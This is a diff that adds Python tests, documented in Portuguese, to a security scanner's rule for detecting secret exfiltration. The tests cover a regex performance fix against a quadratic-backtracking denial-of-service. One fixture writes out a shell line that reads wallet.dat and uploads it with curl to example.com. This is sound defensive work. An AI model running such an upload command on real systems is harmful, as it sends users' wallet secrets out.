@@ -1061,6 +1061,44 @@ class TestRuleH023SecretExfiltration:
         ctx = _ctx(content=b"curl http://example.com/wallet.dat -o wallet.dat")
         assert _r_secret_exfiltration(ctx, "H023") is None
 
+    def test_flag_within_bound_still_triggers(self) -> None:
+        """A flag de upload (-d/-F/...) pode vir bem depois de "curl" na
+        mesma linha (URL longa, headers, etc.) — o bound de 4096 bytes
+        (rodada 2026-10-06, fix de performance) precisa deixar passar
+        qualquer distância realista entre o comando e a flag."""
+        padding = b"https://example.com/api/v1/upload?" + b"a=1&" * 100
+        ctx = _ctx(
+            content=b"wallet.dat keystore cat; curl " + padding + b" -d @wallet.dat"
+        )
+        assert _r_secret_exfiltration(ctx, "H023") is not None
+
+    def test_exfil_net_perf_adversarial_buffer_stays_fast(self) -> None:
+        """Rodada 2026-10-06: auditoria de performance das ~19 regex de
+        conteúdo achou que `_RE_EXFIL_NET` tinha `[^\\n]*` irrestrito antes
+        da flag de upload — "curl" repetido muitas vezes numa única linha
+        sem newline (sem flag de upload nenhuma) forçava cada tentativa de
+        match a varrer o resto do buffer até falhar, O(n²) no total: medido
+        ao vivo, 64KB levava 0.405s e 131KB 1.68s (~4x por 2x de tamanho,
+        assinatura quadrática), extrapolando pra ~29min num buffer de 4MB
+        (cap candidato a aumentar, achado da rodada 2026-09-05/10-05) — de
+        evasão de detecção pra vetor de DoS contra o monitoramento em tempo
+        real. Fix: bound de 4096 bytes no quantificador. Reproduz o buffer
+        adversarial que disparava o bug e garante que fica rápido mesmo em
+        1MB (muito acima do cap atual de 64KB, com margem pro cap que pode
+        vir a aumentar)."""
+        import time
+        unit = b"curl " + b"x" * 60
+        content = b"wallet.dat " + (unit * (1_048_576 // len(unit) + 1))[:1_048_576]
+        ctx = _ctx(content=content)
+        t0 = time.perf_counter()
+        _r_secret_exfiltration(ctx, "H023")
+        elapsed = time.perf_counter() - t0
+        assert elapsed < 1.0, (
+            f"_r_secret_exfiltration em buffer adversarial de 1MB levou "
+            f"{elapsed:.3f}s — regressão do bug quadrático de H023 "
+            f"(_RE_EXFIL_NET), ver rodada 2026-10-06"
+        )
+
 
 # ---------------------------------------------------------------------------
 # Testes: HeuristicEngine
